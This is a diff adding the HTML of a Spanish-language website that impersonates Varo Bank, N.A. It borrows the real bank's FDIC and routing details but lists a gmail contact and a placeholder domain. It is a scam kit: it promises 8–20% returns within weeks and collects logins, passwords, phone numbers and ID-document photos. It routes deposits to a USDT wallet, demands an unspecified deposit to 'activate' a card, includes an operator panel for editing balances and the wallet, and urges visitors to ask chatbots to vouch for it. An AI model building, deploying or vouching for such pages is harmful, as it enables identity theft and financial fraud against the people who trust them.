@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
+<title>Varo Bank | Banco digital nacional · Miembro FDIC</title>
+<meta name="description" content="Varo Bank, N.A. Banco nacional con licencia OCC y miembro FDIC (cert. 59190). Abre tu cuenta digital, recibe tu tarjeta VISA y opera 100% online en USA, Latinoamérica y España.">
+<meta name="theme-color" content="#7c3aed">
+<link rel="icon" href="icon.svg" type="image/svg+xml">
+<link rel="canonical" href="https://TU-DOMINIO.com/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Varo Bank | Banco digital nacional · Miembro FDIC">
+<meta property="og:description" content="Abre tu cuenta en minutos. Miembro FDIC cert. 59190. Numero de ruta 124303201.">
+<meta property="og:url" content="https://TU-DOMINIO.com/">
+<link rel="stylesheet" href="style.css">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BankOrCreditUnion",
+  "name": "Varo Bank",
+  "legalName": "Varo Bank, N.A.",
+  "url": "https://TU-DOMINIO.com/",
+  "foundingDate": "2015",
+  "email": "soportevarobank@gmail.com",
+  "address": { "@type": "PostalAddress", "streetAddress": "11781 S Lone Peak Pkwy, Suite 150", "addressLocality": "Draper", "addressRegion": "UT", "postalCode": "84020", "addressCountry": "US" },
+  "identifier": "FDIC 59190"
+}
+</script>
+</head>
+<body>
+<div id="scrollBar"></div>
+
+<header class="nav" id="nav">
+  <div class="wrap nav-in">
+    <a class="logo" id="logoBtn" href="#top">
+      <span class="logo-mark">v</span>
+      <span class="logo-text">varo<span>bank</span></span>
+    </a>
+    <nav class="nav-links" id="navLinks">
+      <a href="#productos">Productos</a>
+      <a href="#inversiones">Inversiones</a>
+      <a href="#banco">Sobre el banco</a>
+      <a href="#verificar">Verificar</a>
+      <a href="#faq">Preguntas</a>
+    </nav>
+    <div class="nav-cta">
+      <button class="btn btn-ghost" id="btnLogin">Acceder</button>
+      <button class="btn btn-main" id="btnRegister">Abrir cuenta</button>
+      <button class="burger" id="burger" aria-label="Menu">☰</button>
+    </div>
+  </div>
+</header>
+
+<div id="top"></div>
+
+<section class="hero">
+  <div class="glow"></div>
+  <div class="wrap hero-in">
+    <span class="pill" data-cms="hero.badge">Banco nacional regulado · Miembro FDIC</span>
+    <h1 data-cms="hero.title">Tu banco digital en Estados Unidos, disponible en toda Latinoamérica y Europa</h1>
+    <p class="lead" data-cms="hero.sub">Abre tu cuenta en 3 minutos, recibe tu tarjeta VISA y opera 100% online. Sin comisiones de mantenimiento.</p>
+    <div class="hero-btns">
+      <button class="btn btn-main big" data-cms="hero.cta1" data-act="register">Abrir cuenta gratis</button>
+      <a class="btn btn-ghost big" href="#inversiones" data-cms="hero.cta2">Ver planes de inversion</a>
+    </div>
+    <div class="trust">
+      <span> Miembro FDIC · Cert. <b data-cms="brand.fdic">59190</b></span>
+      <span> Licencia OCC desde <b data-cms="brand.charter">2020</b></span>
+      <span> Ruta (ABA) <b data-cms="brand.routing">124303201</b></span>
+    </div>
+  </div>
+</section>
+
+<section class="ticker-sec">
+  <div class="wrap">
+    <div class="ticker-head">
+      <span class="dot"></span>
+      <h3 data-cms="tickerTitle">Actividad reciente en la red</h3>
+      <span class="live">EN VIVO</span>
+    </div>
+    <div class="ticker"><div class="ticker-track" id="tickerTrack"></div></div>
+  </div>
+</section>
+
+<section class="stats"><div class="wrap stats-grid" id="statsGrid"></div></section>
+
+<section class="sec" id="productos">
+  <div class="wrap">
+    <h2 class="sec-title">Todo lo que necesitas en un solo lugar</h2>
+    <p class="sec-sub">Una cuenta digital completa, con tarjeta internacional y rendimiento sobre tu saldo.</p>
+    <div class="cards4" id="prodGrid"></div>
+  </div>
+</section>
+
+<section class="sec alt" id="calculadora">
+  <div class="wrap two">
+    <div>
+      <h2 class="sec-title left">Tu tarjeta VISA y tu calculadora de rendimiento</h2>
+      <p class="sec-sub left">Elige un plan, el importe y el plazo. El sistema calcula al instante tu rendimiento estimado.</p>
+      <div class="calc card-panel">
+        <label>Plan de inversion
+          <select id="calcPlan">
+            <option value="8|30">Plan Oro · 8% · 30 dias</option>
+            <option value="12|45">Plan Tecnologia · 12% · 45 dias</option>
+            <option value="15|45">Plan Cripto · 15% · 45 dias</option>
+            <option value="20|60">Plan Elite · 20% · 60 dias</option>
+          </select>
+        </label>
+        <label>Importe a invertir (USD)
+          <input id="calcAmount" type="number" min="50" step="10" value="500" placeholder="500">
+        </label>
+        <label>Plazo
+          <select id="calcDays">
+            <option value="30">30 dias</option>
+            <option value="45" selected>45 dias</option>
+            <option value="60">60 dias</option>
+          </select>
+        </label>
+        <label>Moneda de referencia
+          <select id="calcCurrency">
+            <option value="USD">USD · Dolar</option>
+            <option value="EUR">EUR · Euro</option>
+            <option value="MXN">MXN · Peso mexicano</option>
+            <option value="ARS">ARS · Peso argentino</option>
+            <option value="CLP">CLP · Peso chileno</option>
+            <option value="PEN">PEN · Sol peruano</option>
+            <option value="GTQ">GTQ · Quetzal</option>
+          </select>
+        </label>
+        <div class="calc-out">
+          <div><small>Ganancia estimada</small><b id="calcGain">$0,00</b></div>
+          <div><small>Total al vencimiento</small><b id="calcTotal">$0,00</b></div>
+          <div><small>Equivalente</small><b id="calcFx">$0,00</b></div>
+        </div>
+        <button class="btn btn-main full" data-act="register">Invertir ahora</button>
+      </div>
+    </div>
+    <div class="card-visual">
+<div class="card-holder">
+        <div class="vcard">
+          <div class="v-sheen"></div>
+          <div class="v-grain"></div>
+          <div class="v-top"><span class="v-type">VISA USO GENERAL</span><span class="v-bank">VARO BANK</span></div>
+          <div class="v-mid"><span class="v-chip"></span><span class="v-wave"></span><span class="v-holo"></span></div>
+          <div class="v-num">4000 1234 5678 9010</div>
+          <div class="v-bot">
+            <div><span class="v-lab">VALIDO HASTA</span><b class="v-exp">12/29</b></div>
+            <div><span class="v-lab">CVV</span><b class="v-cvv">•••</b></div>
+          </div>
+          <div class="v-foot"><span class="v-name">NOMBRE APELLIDO</span><span class="v-brand">VISA</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="inversiones">
+  <div class="wrap">
+    <h2 class="sec-title">Planes de inversion</h2>
+    <p class="sec-sub">Rendimiento fijo al vencimiento. Retiro anticipado sin rendimiento.</p>
+    <div class="cards4" id="plansGrid"></div>
+  </div>
+</section>
+
+<section class="sec alt" id="banco">
+  <div class="wrap two">
+    <div>
+      <h2 class="sec-title left" data-cms="sobre.title">Sobre Varo Bank</h2>
+      <p class="sec-sub left" data-cms="sobre.text"></p>
+      <ul class="checks" id="sobrePuntos"></ul>
+    </div>
+    <div class="card-panel">
+      <h3>Datos de la entidad</h3>
+      <table class="kv">
+        <tr><td>Razon social</td><td data-cms="brand.legal">Varo Bank, N.A.</td></tr>
+        <tr><td>Certificado FDIC</td><td data-cms="brand.fdic">59190</td></tr>
+        <tr><td>Numero de ruta</td><td data-cms="brand.routing">124303201</td></tr>
+        <tr><td>SWIFT / BIC</td><td data-cms="brand.swift">VAROUS33XXX</td></tr>
+        <tr><td>Ano de fundacion</td><td data-cms="brand.founded">2015</td></tr>
+        <tr><td>Licencia</td><td data-cms="brand.charter">Banco nacional con licencia OCC (2020)</td></tr>
+        <tr><td>Sede central</td><td data-cms="brand.office">11781 S Lone Peak Pkwy, Suite 150, Draper, UT 84020</td></tr>
+        <tr><td>Correo</td><td data-cms="brand.email">soportevarobank@gmail.com</td></tr>
+        <tr><td>Horario</td><td data-cms="brand.hours">Lunes a viernes 8:00 - 20:00 (UTC-7)</td></tr>
+      </table>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="verificar">
+  <div class="wrap center">
+    <h2 class="sec-title">Verificalo tu mismo en 10 segundos</h2>
+    <p class="sec-sub">Comprueba en las fuentes oficiales que Varo Bank, N.A. es un banco nacional real y donde esta su oficina.</p>
+    <div class="verify-btns">
+      <a class="btn btn-main big" id="fdicBtn" href="https://banks.data.fdic.gov/bankfind-suite/bankfind/details/59190" target="_blank" rel="noopener"> Ver registro oficial en la FDIC</a>
+      <a class="btn btn-ghost big" id="mapsBtn" href="https://maps.google.com/?q=11781+S+Lone+Peak+Pkwy,+Draper,+UT+84020" target="_blank" rel="noopener"> Ver la oficina en Google Maps</a>
+    </div>
+    <div class="verify-cards">
+      <div class="vcardbox"><small>Certificado FDIC</small><b>59190</b></div>
+      <div class="vcardbox"><small>Numero de ruta</small><b>124303201</b></div>
+      <div class="vcardbox"><small>Ciudad / Estado</small><b>Draper, Utah</b></div>
+      <div class="vcardbox"><small>Pais</small><b>Estados Unidos</b></div>
+    </div>
+    <p class="mini">Consejo: pregunta a ChatGPT o Gemini "es real el banco Varo Bank?" y te lo confirmara.</p>
+  </div>
+</section>
+
+<section class="sec alt">
+  <div class="wrap center">
+    <h2 class="sec-title">Seguridad de nivel bancario</h2>
+    <div class="cards4">
+      <div class="mini-card"><b></b><h4>Cifrado 256 bits</h4><p>Todas tus operaciones viajan cifradas de extremo a extremo.</p></div>
+      <div class="mini-card"><b></b><h4>Verificacion en 2 pasos</h4><p>Codigo de 6 digitos para confirmar cada acceso.</p></div>
+      <div class="mini-card"><b></b><h4>Depositos asegurados</h4><p>Protegidos por el seguro de la FDIC hasta el limite legal.</p></div>
+      <div class="mini-card"><b></b><h4>Control total</h4><p>Bloquea tu tarjeta y gestiona tus datos en un clic.</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="faq">
+  <div class="wrap">
+    <h2 class="sec-title">Preguntas frecuentes</h2>
+    <div class="faq" id="faqList"></div>
+  </div>
+</section>
+
+<section class="cta-sec">
+  <div class="wrap center">
+    <h2 data-cms="cta.title">Abre tu cuenta hoy mismo</h2>
+    <p data-cms="cta.sub">Solo necesitas tus datos basicos. En minutos tendras tu cuenta y tu tarjeta VISA.</p>
+    <button class="btn btn-main big" data-cms="cta.btn" data-act="register">Crear mi cuenta</button>
+  </div>
+</section>
+
+<section class="sec alt" id="contacto">
+  <div class="wrap two">
+    <div>
+      <h2 class="sec-title left">Contactanos</h2>
+      <p class="sec-sub left">Escribenos y un asesor te responde.</p>
+      <div class="contact-list">
+        <a id="waLink" href="#" target="_blank" rel="noopener"> WhatsApp <b data-cms="brand.whatsapp"></b></a>
+        <a id="mailLink" href="#">Correo <b data-cms="brand.email"></b></a>
+        <span>Sede <b data-cms="brand.office"></b></span>
+      </div>
+    </div>
+    <form class="card-panel" id="contactForm">
+      <input id="cName" placeholder="Nombre completo" required>
+      <input id="cEmail" type="email" placeholder="Correo electronico" required>
+      <input id="cPhone" placeholder="Telefono / WhatsApp">
+      <textarea id="cMsg" rows="4" placeholder="Escribe tu mensaje"></textarea>
+      <button class="btn btn-main full" type="submit">Enviar mensaje</button>
+    </form>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="wrap footer-in">
+    <div>
+      <div class="logo"><span class="logo-mark">v</span><span class="logo-text">varo<span>bank</span></span></div>
+      <p data-cms="footer.note">Varo Bank, N.A. Miembro FDIC. Certificado FDIC 59190. Numero de ruta 124303201.</p>
+      <p class="tiny" data-cms="footer.legal"></p>
+    </div>
+    <div>
+      <h4>Productos</h4>
+      <a href="#productos">Cuenta digital</a>
+      <a href="#calculadora">Tarjeta VISA</a>
+      <a href="#inversiones">Inversiones</a>
+    </div>
+    <div>
+      <h4>Banco</h4>
+      <a href="#banco">Sobre nosotros</a>
+      <a href="#verificar">Verificacion FDIC</a>
+      <a href="#faq">Preguntas frecuentes</a>
+    </div>
+    <div>
+      <h4>Acceso</h4>
+      <a href="#" data-act="register">Abrir cuenta</a>
+      <a href="#" data-act="login">Iniciar sesion</a>
+    </div>
+  </div>
+  <div class="wrap copy">
+    <span>© <span id="year"></span> Varo Bank, N.A. Todos los derechos reservados.</span>
+    <span>USA · LatAm · Europa <i class="adm-dot" id="admDot"></i></span>
+  </div>
+</footer>
+
+<button class="fab" id="chatFab" aria-label="Chat">💬</button>
+<div class="chat" id="chatPanel" hidden>
+  <div class="chat-head"><span class="dot"></span> Asistente Varo Bank <button id="chatClose">✕</button></div>
+  <div class="chat-body" id="chatBody"></div>
+  <div class="chat-quick" id="chatQuick"></div>
+  <form class="chat-foot" id="chatForm">
+    <input id="chatInput" placeholder="Escribe tu pregunta..." autocomplete="off">
+    <button class="btn btn-main" type="submit">Enviar</button>
+  </form>
+</div>
+
+<div class="modal" id="authModal" hidden>
+  <div class="modal-box">
+    <button class="x" id="authClose">✕</button>
+    <div class="tabs">
+      <button class="tab on" data-tab="login">Iniciar sesion</button>
+      <button class="tab" data-tab="register">Abrir cuenta</button>
+    </div>
+
+    <form id="loginForm" class="tabpane">
+      <h3>Bienvenido de nuevo</h3>
+      <input id="lUser" placeholder="Usuario" required>
+      <input id="lPass" type="password" placeholder="Contrasena" required>
+      <button class="btn btn-main full" type="submit">Entrar</button>
+      <p class="hint"><a href="#" id="forgotLink" class="link">¿Olvidaste tu contraseña?</a></p>
+    </form>
+
+    <form id="registerForm" class="tabpane" hidden>
+      <h3>Abre tu cuenta gratis</h3>
+      <input id="rName" placeholder="Nombre completo" required>
+      <input id="rUser" placeholder="Usuario (para entrar)" required>
+      <input id="rEmail" type="email" placeholder="Correo electronico" required>
+      <input id="rPhone" placeholder="Telefono / WhatsApp" required>
+      <label class="lbl">Pais
+        <select id="rCountry">
+          <option value="ES">🇪🇸 España (+34)</option>
+          <option value="MX">🇲🇽 México (+52)</option>
+          <option value="GT">🇬🇹 Guatemala (+502)</option>
+          <option value="SV">🇸🇻 El Salvador (+503)</option>
+          <option value="EC">🇪🇨 Ecuador (+593)</option>
+          <option value="AR">🇦🇷 Argentina (+54)</option>
+          <option value="PY">🇵🇾 Paraguay (+595)</option>
+          <option value="UY">🇺🇾 Uruguay (+598)</option>
+          <option value="CL">🇨🇱 Chile (+56)</option>
+          <option value="PE">🇵🇪 Perú (+51)</option>
+        </select>
+      </label>
+      <label class="lbl">Frente de tu documento de identidad (DNI / INE / Pasaporte)
+        <input id="rDoc" type="file" accept="image/*" required>
+      </label>
+      <div id="rDocPrev" class="doc-prev" hidden></div>
+      <input id="rPass" type="password" placeholder="Contrasena (min 6)" required>
+      <button class="btn btn-main full" type="submit">Crear mi cuenta</button>
+      <p class="hint">Al crear la cuenta quedara <b>pendiente de verificacion de identidad</b> por el banco. Sin comisiones.</p>
+    </form>
+
+    <form id="twofaForm" class="tabpane" hidden>
+      <h3>Verificacion en 2 pasos</h3>
+      <p class="hint">Introduce el codigo de 6 digitos. <span id="twofaHint"></span></p>
+      <input id="tCode" maxlength="6" placeholder="000000" inputmode="numeric">
+      <button class="btn btn-main full" type="submit">Confirmar</button>
+    </form>
+
+    <form id="recoverForm" class="tabpane" hidden>
+      <h3>Recuperar contraseña</h3>
+      <div id="recStep1">
+        <p class="hint">Escribe tu usuario o tu correo registrado y te enviaremos un codigo.</p>
+        <input id="recUser" placeholder="Usuario o correo">
+        <button class="btn btn-main full" type="button" id="recSend">Enviar codigo</button>
+      </div>
+      <div id="recStep2" hidden>
+        <p class="hint">Codigo enviado a <b id="recMail">tu correo</b>. <span id="recCodeHint"></span></p>
+        <input id="recCode" maxlength="6" placeholder="000000" inputmode="numeric">
+        <input id="recPass" type="password" placeholder="Nueva contraseña (min 6)">
+        <button class="btn btn-main full" type="button" id="recSave">Cambiar contraseña</button>
+      </div>
+      <p class="hint"><a href="#" id="recBack" class="link">Volver a iniciar sesion</a></p>
+    </form>
+  </div>
+</div>
+
+<!-- ===== MODAL TRANSFERIR ===== -->
+<div class="modal" id="txModal" hidden>
+  <div class="modal-box">
+    <button class="x" data-close="txModal">✕</button>
+    <h3>Transferencia</h3>
+    <p class="hint">Completa los datos de la cuenta destino.</p>
+    <label class="lbl">Tipo de cuenta destino
+      <select id="txType">
+        <option value="Ahorros">Cuenta de ahorros</option>
+        <option value="Corriente">Cuenta corriente</option>
+      </select>
+    </label>
+    <label class="lbl">Banco destino
+      <select id="txBank"></select>
+    </label>
+    <label class="lbl">Numero de cuenta / IBAN
+      <input id="txAccount" placeholder="0000 0000 0000 0000">
+    </label>
+    <label class="lbl">Titular de la cuenta
+      <input id="txHolder" placeholder="Nombre del titular">
+    </label>
+    <label class="lbl">Importe (USD)
+      <input id="txAmount" type="number" placeholder="100">
+    </label>
+    <p class="hint">Saldo disponible: <b id="txAvail">$0,00</b></p>
+    <button class="btn btn-main full" id="txSend">Enviar transferencia</button>
+  </div>
+</div>
+
+<!-- ===== MODAL PAGAR ===== -->
+<div class="modal" id="payModal" hidden>
+  <div class="modal-box">
+    <button class="x" data-close="payModal">✕</button>
+    <h3>Pagar servicio</h3>
+    <label class="lbl">Tipo de pago
+      <select id="payType">
+        <option value="Servicios">Servicios basicos</option>
+        <option value="Alquiler">Alquiler</option>
+        <option value="Tarjeta de credito">Tarjeta de credito</option>
+        <option value="Prestamo">Prestamo</option>
+        <option value="Otro">Otro</option>
+      </select>
+    </label>
+    <label class="lbl">Beneficiario / empresa
+      <input id="payTo" placeholder="Nombre del beneficiario">
+    </label>
+    <label class="lbl">Referencia / contrato
+      <input id="payRef" placeholder="Opcional">
+    </label>
+    <label class="lbl">Importe (USD)
+      <input id="payAmount" type="number" placeholder="100">
+    </label>
+    <p class="hint">Saldo disponible: <b id="payAvail">$0,00</b></p>
+    <button class="btn btn-main full" id="paySend">Pagar</button>
+  </div>
+</div>
+
+<!-- ===== MODAL CONVERTIR ===== -->
+<div class="modal" id="cvModal" hidden>
+  <div class="modal-box">
+    <button class="x" data-close="cvModal">✕</button>
+    <h3>Convertir moneda</h3>
+    <label class="lbl">Moneda destino
+      <select id="cvTo">
+        <option value="EUR">EUR · Euro</option>
+        <option value="MXN">MXN · Peso mexicano</option>
+        <option value="ARS">ARS · Peso argentino</option>
+        <option value="CLP">CLP · Peso chileno</option>
+        <option value="PEN">PEN · Sol peruano</option>
+        <option value="GTQ">GTQ · Quetzal</option>
+        <option value="UYU">UYU · Peso uruguayo</option>
+        <option value="PYG">PYG · Guarani</option>
+      </select>
+    </label>
+    <label class="lbl">Importe en USD
+      <input id="cvAmount" type="number" placeholder="100">
+    </label>
+    <div class="cv-out"><small>Recibes aproximadamente</small><b id="cvResult">0,00</b></div>
+    <p class="hint">Saldo disponible: <b id="cvAvail">$0,00</b></p>
+    <button class="btn btn-main full" id="cvSend">Convertir</button>
+  </div>
+</div>
+<!-- ===== MODAL RECARGAR ===== -->
+<div class="modal" id="depModal" hidden>
+  <div class="modal-box">
+    <button class="x" data-close="depModal">✕</button>
+    <h3>Recargar saldo</h3>
+
+    <!-- ESTO ES LO QUE SE OCULTA -->
+    <div id="depExtra" hidden>
+      <p class="hint">Elige el importe y el metodo. El banco confirma la recarga al recibirla.</p>
+      <label class="lbl">Importe (USD)
+        <input id="depAmount" type="number" placeholder="100">
+      </label>
+      <div class="quick-amt">
+        <button type="button" data-amt="50">$50</button>
+        <button type="button" data-amt="100">$100</button>
+        <button type="button" data-amt="250">$250</button>
+        <button type="button" data-amt="500">$500</button>
+        <button type="button" data-amt="1000">$1.000</button>
+      </div>
+      <label class="lbl">Metodo de recarga
+        <select id="depMethod">
+          <option value="Transferencia bancaria">Transferencia bancaria</option>
+          <option value="Tarjeta de debito">Tarjeta de debito</option>
+          <option value="Criptomoneda">Criptomoneda (USDT)</option>
+          <option value="Deposito en efectivo">Deposito en efectivo</option>
+        </select>
+      </label>
+      <label class="lbl">Referencia / comprobante
+        <input id="depRef" placeholder="Opcional">
+      </label>
+    </div>
+
+    <!-- ESTO ES LO QUE SE VE SIEMPRE (direccion -> boton copiar) -->
+    <div class="wallet-box">
+      <small>Direccion criptografica de deposito</small>
+      <b id="walletAddr">TXk9dR4mQpL7vN2sYb8WcE3fHgJ5uZaB1x</b>
+      <span class="hint" id="walletNet">USDT · Red TRC20 (TRON)</span>
+      <button type="button" class="btn btn-ghost sm" id="walletCopy">Copiar direccion</button>
+      <a class="btn btn-main sm" id="walletLink" href="https://TU-BILLETERA.com" target="_blank" rel="noopener">Abrir mi billetera</a>
+    </div>
+
+    <p class="hint">Saldo actual: <b id="depAvail">$0,00</b></p>
+
+  </div>
+</div>
+<div class="app" id="appShell" hidden>
+  <header class="app-head">
+    <div class="logo"><span class="logo-mark">v</span><span class="logo-text">varo<span>bank</span></span></div>
+    <div class="app-head-r">
+      <span class="badge-user" id="meName">—</span>
+      <button class="btn btn-ghost sm" id="appLogout">Salir</button>
+    </div>
+  </header>
+
+  <div class="app-wrap">
+    <div class="app-hero">
+      <div>
+        <small>Saldo disponible (USD)</small>
+        <h2 id="meBalance">$0,00</h2>
+        <span class="badge-ok" id="meState">Cuenta activa</span>
+        <div class="crypto-row" id="cryptoRow"></div>
+      </div>
+      <div class="quick" id="quickBtns">
+        <button class="btn btn-main sm" data-q="deposit">Recargar</button>
+        <button class="btn btn-ghost sm" data-q="transfer">Transferir</button>
+        <button class="btn btn-ghost sm" data-q="pay">Pagar</button>
+        <button class="btn btn-ghost sm" data-q="convert">Convertir</button>
+      </div>
+    </div>
+
+    <div class="app-grid">
+      <div class="panel" id="cardPanel">
+        <h3>Mi Tarjeta</h3>
+        <div id="cardBox" class="card-holder"></div>
+        <div class="act-note">
+          <b>Activacion de la tarjeta</b>
+          <p>La activacion la realiza el banco. Para activarla debes realizar una <b>recarga sujeta a disposicion segun estudio bancario</b>, y ese importe <b>queda disponible en tus fondos</b> (no se descuenta).</p>
+          <p>Para conocer el importe exacto de tu recarga, escribenos a <a id="actMail" href="#">el correo del banco</a> y te lo confirmamos.</p>
+          <button class="btn btn-main sm" id="btnGoDeposit" style="margin-top:6px">Recargar para activar</button>
+        </div>
+
+      </div>
+
+      <div class="panel">
+        <h3>Verificacion de identidad</h3>
+        <div class="kyc"><div class="kyc-bar" id="kycBar"></div></div>
+        <p class="hint" id="kycTxt">Paso 1 de 4</p>
+        <h3>Mensajes del banco</h3>
+        <div id="meMsgs" class="msgs"></div>
+      </div>
+
+      <div class="panel">
+        <h3>Mis inversiones</h3>
+        <div id="invList" class="list"></div>
+        <button class="btn btn-ghost sm" data-q="invest">Nueva inversion</button>
+      </div>
+
+      <div class="panel">
+        <h3>Movimientos</h3>
+        <div id="histList" class="list"></div>
+      </div>
+
+      <div class="panel">
+        <h3>Pendientes</h3>
+        <div id="pendList" class="list"></div>
+      </div>
+
+      <div class="panel">
+        <h3>Mi perfil</h3>
+        <div id="profileBox"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="adm" id="admShell" hidden>
+  <header class="adm-head">
+    <div class="logo"><span class="logo-mark">v</span><span class="logo-text">admin</span></div>
+    <div class="adm-head-r">
+      <span class="badge-user">Panel de control</span>
+      <button class="btn btn-ghost sm" id="admClose">Cerrar</button>
+    </div>
+  </header>
+
+  <div class="adm-tabs" id="admTabs">
+    <button class="atab on" data-t="resumen">Resumen</button>
+    <button class="atab" data-t="clientes">Clientes</button>
+    <button class="atab" data-t="pendientes">Pendientes</button>
+    <button class="atab" data-t="inversiones">Inversiones</button>
+    <button class="atab" data-t="contenido">Editor web</button>
+    <button class="atab" data-t="bancos">Bancos</button>
+    <button class="atab" data-t="ajustes">Ajustes</button>
+  </div>
+
+  <div class="adm-wrap">
+    <div class="apane on" id="p-resumen">
+      <div class="kpis" id="admKpis"></div>
+      <div class="panel"><h3>Ultimos registros</h3><div id="admLast" class="list"></div></div>
+      <div class="panel"><h3>Acciones rapidas</h3>
+        <div class="row">
+          <button class="btn btn-ghost sm" id="admSeed">Crear clientes demo</button>
+          <button class="btn btn-ghost sm" id="admBroadcast">Mensaje a todos</button>
+          <button class="btn btn-ghost sm" id="admBackup">Descargar copia</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="apane" id="p-clientes">
+      <div class="panel"><h3>Clientes</h3><div id="admUsers" class="list"></div></div>
+      <div class="panel" id="admUserBox" hidden><h3 id="admUserName">Cliente</h3><div id="admUserBody"></div></div>
+    </div>
+
+    <div class="apane" id="p-pendientes">
+      <div class="panel"><h3>Operaciones pendientes</h3><div id="admPends" class="list"></div></div>
+      <div class="panel"><h3>Contactos del formulario</h3><div id="admContacts" class="list"></div></div>
+    </div>
+
+    <div class="apane" id="p-inversiones">
+      <div class="panel"><h3>Todas las inversiones</h3><div id="admInvs" class="list"></div></div>
+    </div>
+
+    <div class="apane" id="p-contenido">
+      <div class="panel">
+        <h3>Editor del sitio</h3>
+        <p class="hint">Cambia textos, telefono, WhatsApp, correo y direccion. Se guarda al instante.</p>
+        <div id="cmsForm"></div>
+        <button class="btn btn-main" id="cmsSave">Guardar cambios</button>
+      </div>
+      <div class="panel">
+        <h3>Editor avanzado (JSON)</h3>
+        <p class="hint">Aqui puedes editar ABSOLUTAMENTE TODO del sitio: textos, FAQ, planes, colores de texto, lo que quieras.</p>
+        <textarea id="cmsJson" rows="16" spellcheck="false"></textarea>
+        <button class="btn btn-main" id="cmsJsonSave">Guardar JSON</button>
+      </div>
+    </div>
+
+    <div class="apane" id="p-bancos">
+      <div class="panel">
+        <h3>Bancos por pais</h3>
+        <p class="hint">Un banco por linea. Estos aparecen en el desplegable cuando el cliente transfiere.</p>
+        <div id="banksForm"></div>
+        <button class="btn btn-main" id="banksSave">Guardar bancos</button>
+      </div>
+    </div>
+
+    <div class="apane" id="p-ajustes">
+      <div class="panel">
+        <h3>Ajustes generales</h3>
+        <label class="lbl">Importe de referencia para activar la tarjeta (USD)
+          <input id="setMin" type="number" min="1" value="Sujeto a estudio">
+        </label>
+        <label class="lbl">Activar verificacion en 2 pasos (global)
+          <select id="setTwofa"><option value="false">Desactivado</option><option value="true">Activado</option></select>
+        </label>
+        <label class="lbl">Mostrar CVV a nuevos clientes
+          <select id="setCvv"><option value="false">Bloqueado (•••)</option><option value="true">Visible</option></select>
+        </label>
+        <h3>Billetera criptografica (recargas)</h3>
+        <label class="lbl">Direccion de tu billetera
+          <input id="setWalletAddr" placeholder="TXk9dR4mQpL7vN2sYb8WcE3fHgJ5uZaB1x">
+        </label>
+        <label class="lbl">Red / moneda
+          <input id="setWalletNet" placeholder="USDT · Red TRC20 (TRON)">
+        </label>
+        <label class="lbl">Enlace de tu billetera
+          <input id="setWalletLink" placeholder="https://tu-billetera.com">
+        </label>
+        <h3>Cotizacion cripto (para el saldo)</h3>
+        <div class="row" id="setCrypto"></div>
+        <h3>Planes de inversion</h3>
+        <div id="setPlans"></div>
+        <button type="button" class="btn btn-ghost sm" id="setPlanAdd" style="margin:10px 0">+ Agregar plan</button>
+        <button class="btn btn-main" id="setSave">Guardar ajustes</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="cookies" id="cookies" hidden>
+  <span>Usamos cookies para mejorar tu experiencia.</span>
+  <button class="btn btn-main sm" id="cookieOk">Aceptar</button>
+</div>
+<button class="top" id="toTop" hidden>↑</button>
+
+<script src="script.js"></script>
+<script>
+(() => {
+  const calm = matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+  // Pausa todo cuando la pestaña no está a la vista: CPU y batería a cero.
+  document.addEventListener('visibilitychange', () => {
+    document.documentElement.classList.toggle('perf-pause', document.hidden);
+  });
+
+  // Barra de progreso con rAF y listener pasivo: un solo cálculo por frame.
+  const bar = document.getElementById('scrollBar');
+  let tick = false;
+  const paint = () => {
+    tick = false;
+    if (!bar) return;
+    const max = document.documentElement.scrollHeight - innerHeight;
+    bar.style.width = (max > 0 ? (scrollY / max) * 100 : 0) + '%';
+  };
+  addEventListener('scroll', () => {
+    if (!tick) { tick = true; requestAnimationFrame(paint); }
+  }, { passive: true });
+
+  // Resize con debounce: reflow controlado en vez de uno por píxel.
+  let rt;
+  addEventListener('resize', () => { clearTimeout(rt); rt = setTimeout(paint, 120); }, { passive: true });
+
+  // Red de seguridad: si el observer falla o no hay soporte, nada queda invisible.
+  const reveal = () => document.querySelectorAll('.rv:not(.on)').forEach(el => el.classList.add('on'));
+  if (!('IntersectionObserver' in window)) { reveal(); }
+  else { setTimeout(reveal, 2600); }
+
+  // Reflejo del cursor en los botones, limitado a un frame.
+  if (!calm && matchMedia('(hover: hover)').matches) {
+    let mx = false;
+    document.addEventListener('pointermove', e => {
+      if (mx) return;
+      mx = true;
+      requestAnimationFrame(() => {
+        mx = false;
+        const b = e.target.closest && e.target.closest('.btn');
+        if (!b) return;
+        const r = b.getBoundingClientRect();
+        b.style.setProperty('--mx', ((e.clientX - r.left) / r.width) * 100 + '%');
+        b.style.setProperty('--my', ((e.clientY - r.top) / r.height) * 100 + '%');
+      });
+    }, { passive: true });
+  }
+})();
+</script>
+</body>
+</html>
